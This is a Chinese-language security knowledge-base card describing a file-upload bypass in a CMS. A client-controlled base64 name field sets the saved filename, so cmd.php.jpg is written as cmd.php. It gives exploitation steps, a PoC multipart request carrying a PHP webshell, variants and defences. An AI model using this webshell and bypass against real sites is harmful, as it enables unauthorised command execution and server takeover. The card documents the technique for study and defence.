---
id: web-generic-file-upload-supercms-base64-name-rename-php
title: 上传接口用 base64 name 字段决定落盘名、扩展名白名单只看上传文件名：cmd.php.jpg 落成 cmd.php
type: scenario
domain: web
path: web/generic/file-upload
technique: upload-base64-name-param-rename-webshell
tags:
- web
- file-upload
- php
- webshell
- filename
- base64
- frontend-bypass
cve: []
severity: high
confidence: low
status: verified
created: '2026-11-12'
updated: '2026-11-12'
verification:
  verified_by: verifier-V622
  verified_at: '2026-11-12T22:03:13+08:00'
  notes: '已对照原文与全部45张图核对：上传x.php被前端ValidateImage拦（允许.jpg/.gif/.png，图26）；正常上传1.php.png保存为../images/1.php.png且响应表单中<input type=hidden name=dGVzdGZpbGUx>被HTML注释（图27放大确认）；base64 -d得testfile1（图28）；改name后上传报only image files!/extension not allowed（图29/31）；最终以.php.jpg上传回显Success: ../images/cmd.php（图32），访问/images/cmd.php?cmd=ls列目录并反弹shell（图33-35）。机制细节（服务端取字段名还是字段值、base64如何解码）原文未展示，卡片confidence low并已自带免责说明，合理。dedup：与upload-allow-param-whitelist-bypass、base64-data-uri等10候选均非同链（related/new），dup-scan无涉及pair。未验证点：未在真实目标复现；最终文件扩展名确由客户端name数据决定这一点属强推断。'
url: /docs/web/generic/file-upload/web-generic-file-upload-supercms-base64-name-rename-php/
draft: false
kb_aliases:
- SuperCMS 上传绕过
- base64 name 字段控制文件名
- 上传改名 getshell
- 前端 JS 校验 + 服务端后缀检查绕过
- php.jpg 落盘为 php
---

## 一句话结论

上传页响应中泄露了一个 base64 编码的 `name` 字段（`dGVzdGZpbGUx` 解码为 `testfile1`），服务端用它决定最终保存名，而扩展名白名单只检查上传文件的原始文件名；把该字段改为目标文件名（如 `cmd.php`）并上传 `cmd.php.jpg`（Content-Type: image/jpeg），文件即以 `images/cmd.php` 落盘，访问即 getshell。

## 原理

- **两个文件名来源**：表单是 `<input type="file" name="image" />`，页面还有一段被注释掉的 `<input type="hidden" name="dGVzdGZpbGUx">`——字段名本身是 base64("testfile1")，说明服务端从客户端可控的 name 数据推导最终文件名（原文未给出服务端源码，无法确定取的是字段名还是字段值）。
- **校验对象与落盘对象不一致**：前端 `onsubmit="javascript:return ValidateImage(this)"` 按浏览器里的文件名检查后缀；服务端另有提示 `extension not allowed, please choose a JPEG or PNG or GIF file.` / `only image files!` 的检查。两者检查的都是上传文件的原始名 `cmd.php.jpg`（末段 .jpg 通过），而最终落盘名来自另一个参数。
- **为什么能执行**：`cmd.php.jpg` 的后缀检查通过后，服务端用 name 字段拼接保存路径/文件名，最终写出 `../images/cmd.php`；PHP 中间件按 `.php` 解析该文件。
- **前端代码修改的作用**：原文通过修改前端表单/HTML 让提交的 name 携带目标文件名（先试 testfile1，再输入 cmd.php），从而同时满足"扩展名检查用 .jpg"和"落盘名用 .php"。
- 这类"文件名来源不一致"是上传绕过的通用模式：校验者看到的文件名与实际写入的文件名来自不同字段。

## 触发条件

- 存在登录后的上传功能，响应 HTML 暴露 base64 形式的 name 字段/文件名参数，且服务端接受客户端提供的最终名。
- 扩展名白名单作用于 multipart 的 filename，而非最终落盘路径。
- 上传目录位于 Web 根内且对应脚本后缀可被解析。

## 利用步骤

1. 登录后台进入上传页（本例为 `/cmsdata/upload.php`），抓响应包，找到隐藏的 base64 name 字段；`echo dGVzdGZpbGUx | base64 -d` 得到 `testfile1`。
2. 在 Burp/DevTools 中把该字段改为目标文件名：按目标实现提交 base64(`cmd.php`)=`Y21kLnBocA==`，或直接修改前端表单使提交的 name 解码为 `cmd.php`。
3. 准备 `cmd.php.jpg`：内容为一句话 PHP，扩展名 `.jpg` 通过前后端检查，Content-Type 用 `image/jpeg`（原文已确认只改 Content-Type 不够）。
4. 提交上传，响应出现 `Success: ../images/cmd.php` 即落盘成功。
5. 访问 `/cmsdata/images/cmd.php?cmd=id` 确认命令执行，再反弹 shell。

## PoC

原文的最终证据是上传页回显 `Success: ../images/cmd.php`，随后 `cmd=ls` 列出图片目录并在 `/cmsdata/images/cmd.php` 执行系统命令。可复现的请求骨架（字段语义按原文 HTML 推断，服务端源码未给出）：

```http
POST /cmsdata/upload.php HTTP/1.1
Host: target
Cookie: PHPSESSID=...
Content-Type: multipart/form-data; boundary=----b

------b
Content-Disposition: form-data; name="name"

cmd.php
------b
Content-Disposition: form-data; name="image"; filename="cmd.php.jpg"
Content-Type: image/jpeg

<?php system($_GET['cmd']); ?>
------b--
```

注意：原文表单里 name 字段以 base64 编码出现（`dGVzdGZpbGUx`=testfile1），实际提交时按目标实现选择 base64 值或改写后的字段名；未在真实目标复现本 PoC。

## 变体与关联

- 变体：name 字段的 base64 只是混淆，换成明文、hex、URL 编码同理；最终名可带 `../` 做目录穿越；也可改为 `.phtml`、`.php5` 等可解析后缀。
- 关联：[[web-generic-file-upload-filename-filepath-parameter-mismatch]]（校验文件名与落盘文件名不同源的通用模式，Java/WAF 场景）；[[web-generic-file-upload-clientside-js-whitelist-bypass]]（仅前端校验）；[[web-generic-file-upload-content-type-trust-bypass]]。
- 边界：服务端若用随机名保存、或对最终落盘名再做一次白名单/规范化，本手法失效。

## 检测与防御

- 服务端生成随机文件名 + 固定白名单后缀，禁止客户端决定最终名；对最终落盘路径统一规范化并再次校验后缀。
- 上传目录移出 Web 根或禁止脚本解析；文件下载走独立静态域。
- 检测：请求中出现 base64 文件名参数且解码后含脚本后缀；落盘文件后缀与 multipart filename 不一致；Web 目录出现脚本文件并被访问。
